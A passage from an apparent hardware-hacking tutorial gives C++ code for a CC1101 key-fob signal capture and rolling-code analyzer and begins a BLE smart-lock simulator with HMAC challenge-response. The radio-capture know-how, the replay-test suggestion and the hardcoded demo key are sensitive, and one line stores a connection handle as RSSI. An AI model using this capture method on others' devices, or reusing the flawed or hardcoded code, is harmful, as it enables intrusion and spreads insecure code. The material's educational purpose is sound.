The capture engine waits for carrier sense to trigger, then records the raw OOK bit stream at high speed:

```cpp
void cc1101_setupAnalyzer() {
    // Reset CC1101
    cc1101_strobe(0x30);  // SRES
    delay(10);

    // Set frequency
    uint32_t freqWord = (uint32_t)((float)TARGET_FREQ /
                         26000000.0f * 65536.0f);
    cc1101_writeReg(0x0D, (freqWord >> 16) & 0xFF);
    cc1101_writeReg(0x0E, (freqWord >> 8) & 0xFF);
    cc1101_writeReg(0x0F, freqWord & 0xFF);

    // Wideband OOK receive for signal analysis
    cc1101_writeReg(0x12, 0x30);  // MDMCFG2: OOK, no sync
    cc1101_writeReg(0x08, 0x32);  // PKTCTRL0: async serial
    cc1101_writeReg(0x00, 0x0E);  // IOCFG2: carrier sense
    cc1101_writeReg(0x02, 0x0D);  // IOCFG0: serial data out

    // Wide bandwidth for capture (325 kHz)
    cc1101_writeReg(0x10, 0x86);  // MDMCFG4
    cc1101_writeReg(0x11, 0x43);  // MDMCFG3

    // Carrier sense threshold: relative, 6dB above RSSI avg
    cc1101_writeReg(0x1D, 0x91);  // AGCCTRL2
    cc1101_writeReg(0x1C, 0x00);  // AGCCTRL1
    cc1101_writeReg(0x1B, 0xB0);  // AGCCTRL0

    cc1101_strobe(0x34);  // SRX - enter receive mode
}

int8_t cc1101_getRSSI() {
    uint8_t raw = cc1101_readStatus(0x34);  // RSSI status reg
    int8_t rssi;
    if (raw >= 128) {
        rssi = (int8_t)((int)(raw) - 256) / 2 - 74;
    } else {
        rssi = (int8_t)(raw / 2) - 74;
    }
    return rssi;
}

bool captureSignal(int captureIndex) {
    SignalCapture* cap = &captures[captureIndex];
    cap->valid = false;
    cap->sampleCount = 0;
    cap->peakRSSI = -120.0;

    // Wait for carrier sense trigger (GDO2 goes HIGH)
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString("Waiting for signal...", 10, 80);

    unsigned long timeout = millis() + 30000;  // 30s timeout
    while (!digitalRead(CC1101_GDO2)) {
        if (millis() > timeout) return false;
    }

    // Signal detected - capture raw bits at high speed
    cap->timestamp = millis();
    unsigned long startUs = micros();
    int rssiIdx = 0;

    for (int i = 0; i < MAX_SAMPLES; i++) {
        cap->rawBits[i] = digitalRead(CC1101_GDO0);

        // Sample RSSI periodically (every 8 samples)
        if ((i & 7) == 0 && rssiIdx < 64) {
            cap->rssiValues[rssiIdx] = cc1101_getRSSI();
            if (cap->rssiValues[rssiIdx] > cap->peakRSSI) {
                cap->peakRSSI = cap->rssiValues[rssiIdx];
            }
            rssiIdx++;
        }

        delayMicroseconds(SAMPLE_INTERVAL_US);
        cap->sampleCount++;

        // Stop if signal ends (no carrier for 5ms)
        if (!digitalRead(CC1101_GDO2)) {
            unsigned long gapStart = micros();
            while (!digitalRead(CC1101_GDO2)) {
                if (micros() - gapStart > 5000) goto done;
                delayMicroseconds(10);
            }
        }
    }

done:
    cap->durationUs = micros() - startUs;
    cap->valid = (cap->sampleCount > 20);  // Need minimum data
    return cap->valid;
}
```

**Step 4 --- Analyze and Compare Captures**

The core analysis compares multiple captures to determine if the code changes between presses:

```cpp
// Count transitions (bit changes) in a capture
int countTransitions(SignalCapture* cap) {
    int transitions = 0;
    for (int i = 1; i < cap->sampleCount; i++) {
        if (cap->rawBits[i] != cap->rawBits[i-1]) {
            transitions++;
        }
    }
    return transitions;
}

// Compare two captures for similarity (0.0 = identical, 1.0 = different)
float compareCapturesDiff(SignalCapture* a, SignalCapture* b) {
    int minLen = min(a->sampleCount, b->sampleCount);
    if (minLen < 10) return 1.0;

    int differences = 0;
    for (int i = 0; i < minLen; i++) {
        if (a->rawBits[i] != b->rawBits[i]) {
            differences++;
        }
    }
    return (float)differences / (float)minLen;
}

// Measure average pulse widths to identify modulation timing
void analyzeTiming(SignalCapture* cap, float* avgHigh,
                   float* avgLow, int* pulseCount) {
    *avgHigh = 0; *avgLow = 0; *pulseCount = 0;
    int highCount = 0, lowCount = 0;
    float highSum = 0, lowSum = 0;
    int runLength = 0;
    uint8_t currentBit = cap->rawBits[0];

    for (int i = 1; i < cap->sampleCount; i++) {
        if (cap->rawBits[i] == currentBit) {
            runLength++;
        } else {
            float durationUs = runLength * SAMPLE_INTERVAL_US;
            if (currentBit == 1) {
                highSum += durationUs;
                highCount++;
            } else {
                lowSum += durationUs;
                lowCount++;
            }
            currentBit = cap->rawBits[i];
            runLength = 1;
        }
    }

    *avgHigh = highCount > 0 ? highSum / highCount : 0;
    *avgLow = lowCount > 0 ? lowSum / lowCount : 0;
    *pulseCount = highCount + lowCount;
}

// Classify: fixed code vs rolling code
const char* classifySignal() {
    if (captureCount < 2) return "Need 2+ captures";

    float totalDiff = 0;
    int comparisons = 0;
    for (int i = 0; i < captureCount - 1; i++) {
        for (int j = i + 1; j < captureCount; j++) {
            if (captures[i].valid && captures[j].valid) {
                totalDiff += compareCapturesDiff(
                    &captures[i], &captures[j]);
                comparisons++;
            }
        }
    }

    if (comparisons == 0) return "Insufficient data";
    float avgDiff = totalDiff / comparisons;

    if (avgDiff < 0.05) return "FIXED CODE (identical)";
    if (avgDiff < 0.15) return "FIXED CODE (minor drift)";
    if (avgDiff > 0.30) return "ROLLING CODE (secure)";
    return "HYBRID/UNKNOWN";
}
```

**Step 5 --- Build the TFT Visualization**

Draw the signal characteristics and comparison results on the display:

```cpp
void drawSignalWaveform(SignalCapture* cap, int y, int height,
                        uint16_t color) {
    int xScale = max(1, cap->sampleCount / 300);
    for (int i = 1; i < min(cap->sampleCount, 300); i++) {
        int x = 10 + i;
        int y1 = cap->rawBits[(i-1)*xScale] ?
                 y : y + height;
        int y2 = cap->rawBits[i*xScale] ?
                 y : y + height;
        tft.drawLine(x-1, y1, x, y2, color);
    }
}

void drawAnalysisScreen() {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setTextSize(1);

    // Title
    tft.drawString("KEY FOB SIGNAL ANALYSIS", 60, 2);
    tft.drawFastHLine(0, 12, 320, TFT_DARKGREY);

    // Draw waveforms for each capture
    uint16_t colors[] = {TFT_CYAN, TFT_GREEN, TFT_YELLOW,
                         TFT_MAGENTA, TFT_RED};
    int waveY = 16;
    for (int i = 0; i < captureCount && i < 3; i++) {
        if (captures[i].valid) {
            tft.setTextColor(colors[i], TFT_BLACK);
            tft.drawString("Press " + String(i+1), 5, waveY);
            drawSignalWaveform(&captures[i], waveY + 2, 12,
                               colors[i]);
            waveY += 20;
        }
    }

    // Separator
    tft.drawFastHLine(0, waveY + 2, 320, TFT_DARKGREY);

    // Analysis results
    int infoY = waveY + 6;
    tft.setTextColor(TFT_WHITE, TFT_BLACK);

    if (captureCount > 0) {
        float avgHigh, avgLow;
        int pulseCount;
        analyzeTiming(&captures[0], &avgHigh, &avgLow,
                      &pulseCount);

        uint32_t freqMHz = TARGET_FREQ / 1000000;
        uint32_t freqKHz = (TARGET_FREQ % 1000000) / 1000;
        tft.drawString("Freq: " + String(freqMHz) + "." +
            String(freqKHz/100) + String((freqKHz/10)%10) +
            " MHz", 5, infoY);
        tft.drawString("Modulation: OOK/ASK", 170, infoY);
        infoY += 10;

        tft.drawString("Duration: " +
            String(captures[0].durationUs / 1000) + " ms",
            5, infoY);
        tft.drawString("Pulses: " + String(pulseCount),
            170, infoY);
        infoY += 10;

        tft.drawString("Avg High: " + String(avgHigh, 0) +
            " us", 5, infoY);
        tft.drawString("Avg Low: " + String(avgLow, 0) +
            " us", 170, infoY);
        infoY += 10;

        tft.drawString("Peak RSSI: " +
            String(captures[0].peakRSSI, 0) + " dBm",
            5, infoY);
        infoY += 14;
    }

    // Classification result
    const char* classification = classifySignal();
    bool isRolling = strstr(classification, "ROLLING") != NULL;
    tft.setTextColor(isRolling ? TFT_GREEN : TFT_RED,
                     TFT_BLACK);
    tft.setTextSize(2);
    tft.drawString(classification, 10, infoY);

    // Comparison matrix
    if (captureCount >= 2) {
        tft.setTextSize(1);
        int matY = infoY + 20;
        tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
        tft.drawString("Similarity Matrix:", 5, matY);
        matY += 10;
        for (int i = 0; i < captureCount - 1; i++) {
            for (int j = i + 1; j < captureCount; j++) {
                float diff = compareCapturesDiff(
                    &captures[i], &captures[j]);
                float similarity = (1.0 - diff) * 100.0;
                tft.setTextColor(
                    similarity > 90 ? TFT_RED : TFT_GREEN,
                    TFT_BLACK);
                tft.drawString("P" + String(i+1) + " vs P" +
                    String(j+1) + ": " +
                    String(similarity, 1) + "% match",
                    5, matY);
                matY += 10;
            }
        }
    }
}
```

**Step 6 --- Implement the Main Capture Loop**

The main loop guides the user through capturing multiple presses:

```cpp
enum AnalyzerState {
    STATE_INTRO,
    STATE_CAPTURING,
    STATE_RESULTS,
};
AnalyzerState state = STATE_INTRO;

void drawIntroScreen() {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setTextSize(2);
    tft.drawString("Key Fob Analyzer", 40, 10);
    tft.setTextSize(1);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("Analyzes YOUR OWN key fob", 60, 40);
    tft.drawString("to demonstrate rolling codes", 50, 52);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString("Freq: " + String(TARGET_FREQ/1000000) +
        "." + String((TARGET_FREQ%1000000)/10000) + " MHz",
        80, 75);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("Press encoder to start capture", 40, 110);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("YOUR OWN key fob ONLY", 65, 135);
}

void drawCapturePrompt(int captureNum) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setTextSize(2);
    tft.drawString("Capture " + String(captureNum) +
        "/" + String(MAX_CAPTURES), 70, 30);
    tft.setTextSize(1);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString("Press your key fob button NOW", 40, 70);
    tft.drawString("(hold fob 1-2 meters from device)", 30, 85);
}

void setup() {
    Serial.begin(115200);
    pinMode(ENCODER_BTN, INPUT_PULLUP);
    pinMode(ENCODER_A, INPUT_PULLUP);
    pinMode(ENCODER_B, INPUT_PULLUP);
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(CC1101_CS, HIGH);
    pinMode(CC1101_GDO0, INPUT);
    pinMode(CC1101_GDO2, INPUT);

    SPI.begin(CC1101_SCLK, CC1101_MISO, CC1101_MOSI,
              CC1101_CS);

    tft.init();
    tft.setRotation(1);

    cc1101_setupAnalyzer();
    drawIntroScreen();
    state = STATE_INTRO;
}

void loop() {
    switch (state) {
        case STATE_INTRO:
            if (digitalRead(ENCODER_BTN) == LOW) {
                delay(200);  // Debounce
                captureCount = 0;
                state = STATE_CAPTURING;
                drawCapturePrompt(1);
            }
            break;

        case STATE_CAPTURING:
            if (captureSignal(captureCount)) {
                captureCount++;
                Serial.printf("Capture %d: %d samples, "
                    "%lu us, RSSI %.0f dBm\n",
                    captureCount,
                    captures[captureCount-1].sampleCount,
                    captures[captureCount-1].durationUs,
                    captures[captureCount-1].peakRSSI);

                if (captureCount >= MAX_CAPTURES) {
                    state = STATE_RESULTS;
                    drawAnalysisScreen();
                } else {
                    tft.fillScreen(TFT_BLACK);
                    tft.setTextColor(TFT_GREEN, TFT_BLACK);
                    tft.setTextSize(2);
                    tft.drawString("Captured!", 100, 40);
                    delay(1000);
                    drawCapturePrompt(captureCount + 1);
                }
            }
            break;

        case STATE_RESULTS:
            // Press encoder to restart
            if (digitalRead(ENCODER_BTN) == LOW) {
                delay(200);
                state = STATE_INTRO;
                drawIntroScreen();
            }
            break;
    }
}
```

**Step 7 --- Run the Analysis on Your Own Key Fob**

1. Upload the sketch to your T-Embed
2. Set `TARGET_FREQ` to match your fob (315 MHz for most US vehicles, 433.92 MHz for European)
3. Press the encoder to start the capture sequence
4. When prompted, press your key fob's lock button --- hold the fob 1--2 meters from the T-Embed
5. Repeat for all 5 captures, pressing the same button each time
6. The analysis screen will show waveforms, timing data, and the classification

**Step 8 --- Interpret the Results**

On the results screen, you will see the similarity matrix. For a modern rolling code fob:

```
KEY FOB SIGNAL ANALYSIS
────────────────────────────────────────
Press 1  ┌──┐  ┌┐┌──┐  ┌┐ ┌──┐┌┐ ┌┐
Press 2  ┌┐┌──┐ ┌┐ ┌──┐┌┐  ┌┐┌──┐┌┐
Press 3  ┌──┐┌┐  ┌──┐┌┐ ┌┐┌──┐  ┌──┐
────────────────────────────────────────
Freq: 315.00 MHz    Modulation: OOK/ASK
Duration: 67 ms     Pulses: 134
Avg High: 400 us    Avg Low: 400 us
Peak RSSI: -42 dBm

ROLLING CODE (secure)

Similarity Matrix:
P1 vs P2: 47.3% match    ← near random
P1 vs P3: 51.1% match    ← near random
P2 vs P3: 49.8% match    ← near random
```

{: .note }
> A similarity near 50% between captures of the same button means the data portion is completely different each time --- exactly what rolling codes produce. Only the preamble and sync word (the first few bits) will be consistent. Fixed-code devices will show 95--100% similarity.

**Step 9 --- Compare with a Fixed-Code Device (Optional)**

If you have an older fixed-code remote (cheap garage door opener, fan remote, LED strip remote), run the same analysis on it. The contrast is dramatic:

```
Fixed-code remote:
P1 vs P2: 98.7% match    ← nearly identical
P1 vs P3: 99.1% match    ← replay attack would work

Rolling-code key fob:
P1 vs P2: 47.3% match    ← completely different
P1 vs P3: 51.1% match    ← replay attack impossible
```

This side-by-side comparison is the most powerful demonstration of why rolling codes exist and why they are effective.

### Expected Results

- Your key fob signal will be detected at either 315 MHz or 433.92 MHz depending on region
- Signal duration will typically be 50--100 ms per button press
- Peak RSSI will be -30 to -60 dBm at 1--2 meters distance
- The similarity matrix will show approximately 45--55% match between captures of the same button (near random chance)
- The analyzer will correctly classify the signal as "ROLLING CODE (secure)"
- The waveform display will show that while the overall signal structure (preamble, timing) is similar, the data portion is visibly different on each press
- If you also test a fixed-code remote, it will show 95%+ similarity and classify as "FIXED CODE"

### Extensions

- Add frequency scanning to auto-detect key fob frequency instead of hardcoding it
- Implement a preamble extractor that isolates the consistent sync pattern from the changing data
- Log all captures to SPIFFS with timestamps for later analysis
- Add a "signal replay test" that retransmits a captured signal and notes that the car does NOT respond (proving rolling code security)
- Build a comparison mode that analyzes two different devices side by side on a split screen
- Add estimated bit rate calculation from pulse timing analysis

---

## Project 18: BLE Proximity Door Lock Simulator
{: .d-inline-block }

Advanced
{: .label .label-red }

### Overview

Bluetooth Low Energy (BLE) is rapidly becoming the dominant technology for smart door locks. Products from August, Yale, Schlage, and dozens of other manufacturers use BLE to let you unlock your front door with your phone. But how does a BLE lock actually work? How does it know your phone is authorized? What prevents someone from simply spoofing the connection? And what are the real-world vulnerabilities that security researchers have discovered in commercial BLE locks?

In this project you will build a fully functional BLE proximity door lock proof of concept on the T-Embed CC1101 Plus. The T-Embed acts as the lock controller --- a BLE peripheral that advertises itself, accepts connections from authorized devices, and performs challenge-response authentication before granting access. When an authorized phone (or second ESP32) comes within range and passes the cryptographic challenge, the lock "opens" --- indicated visually on the TFT, audibly through the buzzer, and logged with a timestamp. The system uses a proper GATT service with custom characteristics for lock state, authentication, and device management.

Beyond building a working lock, this project teaches you about the vulnerabilities that plague real-world BLE locks. You will learn about relay attacks (where an attacker extends the BLE range to unlock a door from miles away), replay attacks, man-in-the-middle attacks, and why RSSI-based proximity detection is fundamentally unreliable as a sole security mechanism. This knowledge is essential for anyone evaluating or deploying BLE-based physical access control systems.

{: .warning }
> This is a **simulation and educational tool**, not a production door lock. Never use this code to control actual physical access. Real smart locks require certified hardware, tamper-resistant enclosures, redundant authentication, and extensive security auditing. This project teaches the concepts so you can evaluate commercial products intelligently.

### What You'll Learn

- BLE GATT service and characteristic design for access control
- BLE peripheral (server) and central (client) architecture
- Challenge-response authentication using HMAC-SHA256
- RSSI-based proximity estimation and its fundamental limitations
- BLE bonding and device whitelisting
- Real-world BLE lock vulnerabilities: relay attacks, MITM, replay
- Event logging and audit trail design
- Audio and visual feedback for physical access systems
- ESP32 NimBLE stack for Bluetooth Low Energy

### Materials Needed

- T-Embed CC1101 Plus (acts as the lock controller / BLE peripheral)
- Smartphone with nRF Connect app (free, iOS/Android) or a second ESP32 as the "key"
- USB-C cable for programming
- Arduino IDE or PlatformIO with NimBLE-Arduino library installed
- (Optional) Small piezo buzzer for audible lock/unlock feedback
- (Optional) LED or relay module to simulate an actual lock mechanism

{: .tip }
> Install the **NimBLE-Arduino** library from the Arduino Library Manager. NimBLE uses significantly less flash and RAM than the default ESP32 BLE library, which is critical on the ESP32-S3.

### Step-by-Step Instructions

**Step 1 --- Design the GATT Service Architecture**

A GATT (Generic Attribute Profile) service is how BLE devices expose structured data and functionality. Our lock uses a custom service with four characteristics:

```
┌───────────────────────────────────────────────────┐
│         Door Lock Service                         │
│         UUID: 12345678-1234-5678-ABCD-1234567890AB│
├───────────────────────────────────────────────────┤
│                                                   │
│  ┌─── Lock State Characteristic ───────────────┐  │
│  │ UUID: ...0001  | Read, Notify               │  │
│  │ Values: 0x00 = Locked, 0x01 = Unlocked      │  │
│  │ Notifies client when state changes           │  │
│  └─────────────────────────────────────────────┘  │
│                                                   │
│  ┌─── Auth Challenge Characteristic ───────────┐  │
│  │ UUID: ...0002  | Read                        │  │
│  │ Returns a fresh 16-byte random nonce         │  │
│  │ Nonce changes on every read                  │  │
│  └─────────────────────────────────────────────┘  │
│                                                   │
│  ┌─── Auth Response Characteristic ────────────┐  │
│  │ UUID: ...0003  | Write                       │  │
│  │ Client writes HMAC-SHA256(nonce, secret_key) │  │
│  │ If valid: lock toggles, state notified       │  │
│  │ If invalid: attempt logged, client rejected  │  │
│  └─────────────────────────────────────────────┘  │
│                                                   │
│  ┌─── Event Log Characteristic ────────────────┐  │
│  │ UUID: ...0004  | Read                        │  │
│  │ Returns last 10 events as JSON               │  │
│  │ (timestamp, action, device, RSSI)            │  │
│  └─────────────────────────────────────────────┘  │
│                                                   │
└───────────────────────────────────────────────────┘
```

{: .note }
> Real BLE locks use 128-bit UUIDs registered with the Bluetooth SIG and implement the lock service over the Device Information Service and proprietary profiles. Our custom UUIDs are fine for a proof of concept.

**Step 2 --- Set Up the Arduino Project**

```cpp
// ============================================================
// BLE Proximity Door Lock Simulator
// T-Embed CC1101 Plus as BLE Lock Controller (Peripheral)
// Authentication: HMAC-SHA256 Challenge-Response
// ============================================================

#include <NimBLEDevice.h>
#include <TFT_eSPI.h>
#include <mbedtls/md.h>    // For HMAC-SHA256 (built into ESP32)
#include <esp_random.h>     // For hardware RNG

// --- Pin Definitions ---
#define ENCODER_BTN    6
#define BUZZER_PIN     46
#define LED_PIN        48   // Optional lock indicator LED

// --- BLE UUIDs ---
#define SERVICE_UUID        "12345678-1234-5678-ABCD-1234567890AB"
#define LOCK_STATE_UUID     "12345678-1234-5678-ABCD-123456780001"
#define AUTH_CHALLENGE_UUID "12345678-1234-5678-ABCD-123456780002"
#define AUTH_RESPONSE_UUID  "12345678-1234-5678-ABCD-123456780003"
#define EVENT_LOG_UUID      "12345678-1234-5678-ABCD-123456780004"

// --- Security Configuration ---
// Shared secret key (in production: unique per lock, stored in secure element)
const uint8_t SECRET_KEY[32] = {
    0x4D, 0x79, 0x53, 0x65, 0x63, 0x72, 0x65, 0x74,
    0x4B, 0x65, 0x79, 0x46, 0x6F, 0x72, 0x42, 0x4C,
    0x45, 0x4C, 0x6F, 0x63, 0x6B, 0x44, 0x65, 0x6D,
    0x6F, 0x50, 0x72, 0x6F, 0x6A, 0x65, 0x63, 0x74
};  // "MySecretKeyForBLELockDemoProject"

// --- RSSI Proximity Threshold ---
#define RSSI_UNLOCK_THRESHOLD  -65  // Must be within ~2 meters
#define RSSI_LOCK_THRESHOLD    -80  // Lock when device moves away

// --- Lock State ---
bool isLocked = true;
uint8_t currentNonce[16];
unsigned long lastUnlockTime = 0;
#define AUTO_LOCK_MS  10000  // Auto-lock after 10 seconds

// --- Authorized Devices (MAC whitelist) ---
#define MAX_AUTHORIZED 5
NimBLEAddress authorizedDevices[MAX_AUTHORIZED];
int authorizedCount = 0;

// --- Event Log ---
struct LockEvent {
    unsigned long timestamp;
    char action[16];    // "UNLOCK", "LOCK", "AUTH_FAIL", "CONNECT"
    char device[18];    // MAC address string
    int8_t rssi;
};
#define MAX_EVENTS 20
LockEvent eventLog[MAX_EVENTS];
int eventCount = 0;
int eventHead = 0;

// --- Display ---
TFT_eSPI tft = TFT_eSPI();
#define SCREEN_W 320
#define SCREEN_H 170

// --- BLE Server Objects ---
NimBLEServer* pServer = nullptr;
NimBLECharacteristic* pLockState = nullptr;
NimBLECharacteristic* pAuthChallenge = nullptr;
NimBLECharacteristic* pAuthResponse = nullptr;
NimBLECharacteristic* pEventLogChar = nullptr;
bool deviceConnected = false;
int8_t connectedRSSI = -127;
```

**Step 3 --- Implement the HMAC-SHA256 Challenge-Response**

The challenge-response protocol prevents replay attacks. The lock generates a random nonce, the client must compute HMAC-SHA256 of that nonce using the shared secret, and the lock verifies the result:

```cpp
// Generate a cryptographically random 16-byte nonce
void generateNonce() {
    for (int i = 0; i < 16; i++) {
        currentNonce[i] = (uint8_t)(esp_random() & 0xFF);
    }
}

// Compute HMAC-SHA256(nonce, key) and compare with response
bool verifyAuthResponse(const uint8_t* response, size_t len) {
    if (len != 32) return false;  // SHA256 = 32 bytes

    uint8_t expected[32];
    mbedtls_md_context_t ctx;
    mbedtls_md_init(&ctx);
    mbedtls_md_setup(&ctx,
        mbedtls_md_info_from_type(MBEDTLS_MD_SHA256), 1);
    mbedtls_md_hmac_starts(&ctx, SECRET_KEY, 32);
    mbedtls_md_hmac_update(&ctx, currentNonce, 16);
    mbedtls_md_hmac_finish(&ctx, expected);
    mbedtls_md_free(&ctx);

    // Constant-time comparison to prevent timing attacks
    uint8_t diff = 0;
    for (int i = 0; i < 32; i++) {
        diff |= expected[i] ^ response[i];
    }
    return (diff == 0);
}

// Log an event
void logEvent(const char* action, const char* device,
              int8_t rssi) {
    LockEvent* e = &eventLog[eventHead];
    e->timestamp = millis() / 1000;
    strncpy(e->action, action, sizeof(e->action) - 1);
    strncpy(e->device, device, sizeof(e->device) - 1);
    e->rssi = rssi;
    eventHead = (eventHead + 1) % MAX_EVENTS;
    if (eventCount < MAX_EVENTS) eventCount++;
}
```

{: .warning }
> The shared secret key is hardcoded here for demonstration purposes. In a real product, each lock would have a unique key stored in the ESP32's eFuse or a secure element, provisioned during manufacturing. The key would never appear in source code.

**Step 4 --- Implement the BLE Callbacks**

These callbacks handle BLE connection events and characteristic read/write operations:

```cpp
// --- Server Callbacks ---
class LockServerCallbacks : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer* pServer,
                   NimBLEConnInfo& connInfo) override {
        deviceConnected = true;
        String addr = connInfo.getAddress().toString().c_str();
        connectedRSSI = connInfo.getConnHandle();
        Serial.println("Connected: " + addr);
        logEvent("CONNECT", addr.c_str(), 0);
        generateNonce();  // Fresh nonce for this session
        updateDisplay();
    }

    void onDisconnect(NimBLEServer* pServer,
                      NimBLEConnInfo& connInfo,
                      int reason) override {
        deviceConnected = false;
        connectedRSSI = -127;
        Serial.println("Disconnected");
        updateDisplay();
        // Resume advertising
        NimBLEDevice::startAdvertising();
    }
};

// --- Auth Response Write Callback ---
class AuthResponseCallbacks
    : public NimBLECharacteristicCallbacks {
    void onWrite(NimBLECharacteristic* pChar,
                 NimBLEConnInfo& connInfo) override {
        std::string value = pChar->getValue();
        String addr = connInfo.getAddress().toString().c_str();

        if (verifyAuthResponse(
                (const uint8_t*)value.data(), value.length())) {
            // Authentication successful
            Serial.println("Auth SUCCESS from " + addr);
            toggleLock();
            logEvent(isLocked ? "LOCK" : "UNLOCK",
                     addr.c_str(), connectedRSSI);

            // Notify lock state change
            uint8_t state = isLocked ? 0x00 : 0x01;
            pLockState->setValue(&state, 1);
            pLockState->notify();
        } else {
            // Authentication failed
            Serial.println("Auth FAILED from " + addr);
            logEvent("AUTH_FAIL", addr.c_str(), connectedRSSI);

            // Play error tone
            ledcWriteTone(0, 200);
            delay(500);
            ledcWriteTone(0, 0);
        }

        // Generate new nonce (single-use)
        generateNonce();
        pAuthChallenge->setValue(currentNonce, 16);
        updateDisplay();
    }
};

// --- Challenge Read Callback ---
class ChallengeReadCallbacks
    : public NimBLECharacteristicCallbacks {
    void onRead(NimBLECharacteristic* pChar,
                NimBLEConnInfo& connInfo) override {
        // Return the current nonce
        pChar->setValue(currentNonce, 16);
        Serial.println("Challenge nonce read by client");
    }
};
```

**Step 5 --- Implement Lock Control and Audio Feedback**

```cpp
void toggleLock() {
    isLocked = !isLocked;

    if (!isLocked) {
        // Unlock sequence: ascending tones
        ledcWriteTone(0, 880);
        delay(100);
        ledcWriteTone(0, 1100);
        delay(100);
        ledcWriteTone(0, 1320);
        delay(150);
        ledcWriteTone(0, 0);
        lastUnlockTime = millis();
        if (LED_PIN > 0) digitalWrite(LED_PIN, HIGH);
    } else {
        // Lock sequence: descending tone
        ledcWriteTone(0, 1320);
        delay(100);
        ledcWriteTone(0, 880);
        delay(100);
        ledcWriteTone(0, 660);
        delay(150);
        ledcWriteTone(0, 0);
        if (LED_PIN > 0) digitalWrite(LED_PIN, LOW);
    }
}

void checkAutoLock() {
    if (!isLocked && (millis() - lastUnlockTime > AUTO_LOCK_MS)) {
        isLocked = true;
        logEvent("AUTO_LOCK", "SYSTEM", 0);

        uint8_t state = 0x00;
        pLockState->setValue(&state, 1);
        if (deviceConnected) pLockState->notify();

        ledcWriteTone(0, 660);
        delay(200);
        ledcWriteTone(0, 0);
        if (LED_PIN > 0) digitalWrite(LED_PIN, LOW);
        updateDisplay();
    }
}
```

**Step 6 --- Build the TFT Display**

The display shows lock status, connected device info, RSSI, and an event log:

```cpp
void updateDisplay() {
    tft.fillScreen(TFT_BLACK);

    // --- Lock Status (large, centered) ---
    tft.setTextSize(3);
    if (isLocked) {
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.drawString("LOCKED", 100, 5);
        // Draw lock icon
        tft.fillRect(145, 30, 30, 25, TFT_RED);
        tft.drawRect(150, 20, 20, 15, TFT_RED);
    } else {
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.drawString("UNLOCKED", 75, 5);
        tft.fillRect(145, 30, 30, 25, TFT_GREEN);
        tft.drawRect(155, 20, 20, 15, TFT_GREEN);
    }

    // --- Connection Status ---
    tft.setTextSize(1);
    tft.drawFastHLine(0, 60, SCREEN_W, TFT_DARKGREY);
    int infoY = 64;

    if (deviceConnected) {
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.drawString("BLE: Connected", 5, infoY);
        tft.drawString("RSSI: " + String(connectedRSSI) +
                        " dBm", 170, infoY);
    } else {
        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.drawString("BLE: Advertising... waiting for key",
                        5, infoY);
    }
    infoY += 12;

    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawString("Authorized devices: " +
        String(authorizedCount), 5, infoY);
    tft.drawString("Auto-lock: " +
        String(AUTO_LOCK_MS/1000) + "s", 200, infoY);
    infoY += 14;

    // --- Event Log ---
    tft.drawFastHLine(0, infoY, SCREEN_W, TFT_DARKGREY);
    infoY += 4;
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("EVENT LOG", 130, infoY);
    infoY += 12;

    // Show last 6 events
    for (int i = 0; i < min(eventCount, 6); i++) {
        int idx = (eventHead - 1 - i + MAX_EVENTS) % MAX_EVENTS;
        LockEvent* e = &eventLog[idx];

        // Color by event type
        if (strcmp(e->action, "UNLOCK") == 0) {
            tft.setTextColor(TFT_GREEN, TFT_BLACK);
        } else if (strcmp(e->action, "LOCK") == 0 ||
                   strcmp(e->action, "AUTO_LOCK") == 0) {
            tft.setTextColor(TFT_CYAN, TFT_BLACK);
        } else if (strcmp(e->action, "AUTH_FAIL") == 0) {
            tft.setTextColor(TFT_RED, TFT_BLACK);
        } else {
            tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
        }

        char line[50];
        snprintf(line, sizeof(line), "%lus %-10s %s %ddBm",
            e->timestamp, e->action, e->device, e->rssi);
        tft.drawString(line, 5, infoY);
        infoY += 10;
        if (infoY > SCREEN_H - 5) break;
    }
}
```

The display layout:

```
┌──────────────────────────────────────────┐
│            LOCKED                        │
│             ┌──┐                         │
│             │██│ (lock icon)             │
│──────────────────────────────────────────│
│ BLE: Connected        RSSI: -52 dBm     │
│ Authorized: 2         Auto-lock: 10s    │
│──────────────────────────────────────────│
│              EVENT LOG                   │
│ 342s UNLOCK    AA:BB:CC:DD:EE -52dBm   │
│ 298s LOCK      AA:BB:CC:DD:EE -48dBm   │
│ 295s AUTH_FAIL 11:22:33:44:55 -71dBm   │
│ 201s CONNECT   AA:BB:CC:DD:EE   0dBm   │
│  45s AUTO_LOCK SYSTEM             0dBm   │
└──────────────────────────────────────────┘
```

**Step 7 --- Initialize the BLE Server**

```cpp
void setup() {
    Serial.begin(115200);
    pinMode(ENCODER_BTN, INPUT_PULLUP);
    if (LED_PIN > 0) { pinMode(LED_PIN, OUTPUT); }

    // Audio setup
    ledcSetup(0, 1000, 8);
    ledcAttachPin(BUZZER_PIN, 0);
    ledcWriteTone(0, 0);

    // Display setup
    tft.init();
    tft.setRotation(1);
    tft.fillScreen(TFT_BLACK);

    // Generate initial nonce
    generateNonce();

    // Initialize BLE
    NimBLEDevice::init("BLE-Lock-Demo");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // Max TX power
    NimBLEDevice::setSecurityAuth(true, true, true);

    // Create BLE Server
    pServer = NimBLEDevice::createServer();
    pServer->setCallbacks(new LockServerCallbacks());

    // Create Lock Service
    NimBLEService* pService =
